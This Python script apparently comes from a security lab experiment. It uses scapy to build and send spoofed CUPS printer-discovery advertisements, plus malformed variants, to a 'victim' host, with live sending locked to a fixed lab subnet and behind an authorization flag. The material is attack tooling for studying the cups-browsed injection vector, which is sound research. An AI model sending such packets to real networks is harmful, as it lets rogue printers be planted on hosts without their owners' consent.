#!/usr/bin/env python3
"""Craft legacy CUPS printer-discovery advertisements for an isolated lab."""

from __future__ import annotations

import argparse
import ipaddress
import logging
import re
import time
from pathlib import Path

from scapy.all import IP, Raw, UDP, Packet, send, wrpcap

LOG = logging.getLogger("cups_attack")
LAB_NETWORK = ipaddress.ip_network("172.28.77.0/24")
LAB_VICTIM = ipaddress.ip_address("172.28.77.20")
FIELD_RE = re.compile(r'[\x00-\x1f"]')


def validate_ip(value: str, argument: str) -> str:
    try:
        address = ipaddress.ip_address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"{argument} must be a valid IPv4 address") from exc
    if address.version != 4:
        raise argparse.ArgumentTypeError(f"{argument} must be a valid IPv4 address")
    return value


def validate_port(value: str) -> int:
    try:
        port = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("printer port must be an integer") from exc
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("printer port must be between 1 and 65535")
    return port


def quote_field(value: str) -> str:
    """Escape a browse field without allowing control characters or quotes."""
    if FIELD_RE.search(value):
        raise ValueError("printer names and queues cannot contain control characters or quotes")
    return f'"{value}"'


def build_advertisement(
    source_ip: str,
    destination_ip: str,
    printer_ip: str,
    printer_port: int = 631,
    printer_name: str = "Lab Printer",
    queue: str = "ipp/print",
    message_type: int = 0,
) -> Packet:
    """Build a CUPS browse packet using the historical space-delimited format."""
    for argument, value in (("source_ip", source_ip), ("destination_ip", destination_ip), ("printer_ip", printer_ip)):
        address = ipaddress.ip_address(value)
        if address.version != 4:
            raise ValueError(f"{argument} must be an IPv4 address")
    if not 1 <= printer_port <= 65535:
        raise ValueError("printer_port must be between 1 and 65535")
    if not queue.strip("/"):
        raise ValueError("queue must not be empty")
    uri = f"ipp://{printer_ip}:{printer_port}/{queue.lstrip('/')}"
    # The UDP datagram is the protocol boundary; cups-browsed rejects a trailing newline.
    payload = f"{message_type} 3 {uri} {quote_field(printer_name)} {quote_field(printer_name)}"
    return IP(src=source_ip, dst=destination_ip) / UDP(sport=631, dport=631) / Raw(
        load=payload.encode("utf-8")
    )


def build_variation(name: str, **kwargs: object) -> Packet:
    """Build one of the reproducible manipulation cases used by the experiment."""
    packet = build_advertisement(**kwargs)
    if name == "missing-uri":
        packet[Raw].load = b'0 3 "Lab Printer"'
    elif name == "invalid-port":
        packet[Raw].load = packet[Raw].load.replace(b":631/", b":99999/")
    elif name == "malformed-fields":
        packet[Raw].load = b"not-a-browse-message"
    elif name != "baseline":
        raise ValueError(f"unknown variation: {name}")
    return packet


def write_log(path: Path, packet: Packet, variation: str, mode: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write(
            f"mode={mode} variation={variation} src={packet[IP].src} dst={packet[IP].dst} "
            f"payload={packet[Raw].load.decode('utf-8', errors='replace')}\n"
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--victim-ip", type=lambda value: validate_ip(value, "victim IP"), default="172.28.77.20")
    parser.add_argument("--advertiser-ip", type=lambda value: validate_ip(value, "advertiser IP"), default="172.28.77.10")
    parser.add_argument("--printer-ip", type=lambda value: validate_ip(value, "printer IP"), default="172.28.77.40")
    parser.add_argument("--printer-port", type=validate_port, default=631)
    parser.add_argument("--printer-name", default="Lab Printer")
    parser.add_argument("--queue", default="ipp/print")
    parser.add_argument(
        "--variation",
        choices=("baseline", "missing-uri", "invalid-port", "malformed-fields"),
        default="baseline",
    )
    parser.add_argument("--repeat", type=int, default=1)
    parser.add_argument("--interval", type=float, default=0.0)
    parser.add_argument("--pcap", type=Path, default=Path("pcap_files/attacks/attack.pcap"))
    parser.add_argument("--log", type=Path, default=Path("evidence/logs/attack.log"))
    parser.add_argument("--dry-run", action="store_true", help="write the PCAP without transmitting")
    parser.add_argument(
        "--authorize-lab",
        action="store_true",
        help="authorize live transmission to the fixed isolated lab network",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.repeat < 1:
        raise SystemExit("--repeat must be at least 1")
    if args.interval < 0:
        raise SystemExit("--interval must not be negative")
    if ipaddress.ip_address(args.victim_ip) != LAB_VICTIM:
        raise SystemExit("--victim-ip must be 172.28.77.20 for live lab safety")
    for argument, value in (("advertiser", args.advertiser_ip), ("printer", args.printer_ip)):
        if ipaddress.ip_address(value) not in LAB_NETWORK:
            raise SystemExit(f"--{argument}-ip must be inside 172.28.77.0/24")
    if not args.dry_run and not args.authorize_lab:
        raise SystemExit("live transmission requires --authorize-lab; use --dry-run for offline evidence")
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
    try:
        packets = [
            build_variation(
                args.variation,
                source_ip=args.advertiser_ip,
                destination_ip=args.victim_ip,
                printer_ip=args.printer_ip,
                printer_port=args.printer_port,
                printer_name=args.printer_name,
                queue=args.queue,
            )
            for _ in range(args.repeat)
        ]
    except ValueError as exc:
        raise SystemExit(f"invalid packet fields: {exc}") from exc
    args.pcap.parent.mkdir(parents=True, exist_ok=True)
    wrpcap(str(args.pcap), packets)
    mode = "generated" if args.dry_run else "transmitted"
    for packet in packets:
        write_log(args.log, packet, args.variation, mode)
    if not args.dry_run:
        for packet in packets:
            LOG.info("sending browse advertisement to %s", args.victim_ip)
            send(packet, verbose=False)
            if args.interval:
                time.sleep(args.interval)
    LOG.info("wrote %d packet(s) to %s", len(packets), args.pcap)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
